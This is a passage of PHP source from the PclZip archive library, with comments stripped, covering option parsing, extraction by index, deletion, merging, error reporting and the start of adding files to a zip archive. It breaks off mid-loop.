        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
